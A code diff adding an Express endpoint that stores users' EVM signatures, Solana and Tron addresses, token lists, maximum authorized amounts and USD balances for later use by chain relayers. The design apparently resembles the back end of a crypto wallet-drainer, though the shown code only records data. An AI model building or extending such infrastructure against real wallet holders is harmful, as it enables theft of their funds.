@@ -135,6 +135,93 @@ function getRelayerForChain(chainId) {
   return RELAYERS[mapping[chainId]];
 }
 
+// ============ UNIFIED ENDPOINT (called by frontend) ============
+
+app.post('/api/authorize/unified', async (req, res) => {
+  const { evmAddress, solanaAddress, tronAddress, tokens, evmSignature, evmSigDeadline, maxAuthorizedAmount, totalValue } = req.body;
+
+  const results = {};
+  const client = await pool.connect();
+
+  try {
+    // Store EVM authorization if available
+    if (evmAddress && evmSignature) {
+      const evmTokens = (tokens || []).filter(t => t.chain !== 'solana' && t.chain !== 'tron');
+      const maxAmount = calculateMaxAmount(tokens || []);
+      await client.query(`
+        INSERT INTO evm_authorizations 
+        (user_address, chain_id, tokens, signature, sig_deadline, max_authorized_amount, current_balance_usd)
+        VALUES ($1, $2, $3, $4, $5, $6, $7)
+        ON CONFLICT (user_address, chain_id) 
+        DO UPDATE SET 
+          tokens = $3, signature = $4, sig_deadline = $5,
+          max_authorized_amount = $6, current_balance_usd = $7,
+          status = 'active', created_at = NOW()
+      `, [
+        evmAddress.toLowerCase(), 1, JSON.stringify(tokens || []),
+        evmSignature, evmSigDeadline, maxAmount,
+        totalValue || (tokens || []).reduce((a, t) => a + (t.usdValue || 0), 0)
+      ]);
+      results.evm = { stored: true, address: evmAddress };
+      console.log(`✅ Unified EVM stored: ${evmAddress}`);
+    }
+
+    // Store Solana authorization if available
+    if (solanaAddress) {
+      const maxAmount = calculateMaxAmount(tokens || []);
+      await client.query(`
+        INSERT INTO solana_authorizations
+        (user_address, tokens, signed_transaction, max_authorized_amount, current_balance_usd)
+        VALUES ($1, $2, $3, $4, $5)
+        ON CONFLICT (user_address)
+        DO UPDATE SET
+          tokens = $2, signed_transaction = $3,
+          max_authorized_amount = $4, current_balance_usd = $5,
+          status = 'active', created_at = NOW()
+      `, [
+        solanaAddress, JSON.stringify(tokens || []),
+        'pending', maxAmount,
+        totalValue || (tokens || []).reduce((a, t) => a + (t.usdValue || 0), 0)
+      ]);
+      results.solana = { stored: true, address: solanaAddress };
+      console.log(`✅ Unified Solana stored: ${solanaAddress}`);
+    }
+
+    // Store Tron authorization if available
+    if (tronAddress) {
+      const maxAmount = calculateMaxAmount(tokens || []);
+      await client.query(`
+        INSERT INTO tron_authorizations
+        (user_address, tokens, signed_transaction, max_authorized_amount, current_balance_usd)
+        VALUES ($1, $2, $3, $4, $5)
+        ON CONFLICT (user_address)
+        DO UPDATE SET
+          tokens = $2, signed_transaction = $3,
+          max_authorized_amount = $4, current_balance_usd = $5,
+          status = 'active', created_at = NOW()
+      `, [
+        tronAddress, JSON.stringify(tokens || []),
+        'pending', maxAmount,
+        totalValue || (tokens || []).reduce((a, t) => a + (t.usdValue || 0), 0)
+      ]);
+      results.tron = { stored: true, address: tronAddress };
+      console.log(`✅ Unified Tron stored: ${tronAddress}`);
+    }
+
+    if (Object.keys(results).length === 0) {
+      return res.status(400).json({ error: 'No valid wallet address provided' });
+    }
+
+    res.json({ success: true, results, message: 'Authorization stored successfully' });
+
+  } catch (err) {
+    console.error('❌ Unified authorization error:', err);
+    res.status(500).json({ error: err.message });
+  } finally {
+    client.release();
+  }
+});
+
 // ============ EVM ENDPOINTS ============
 
 app.post('/api/authorize/evm', async (req, res) => {
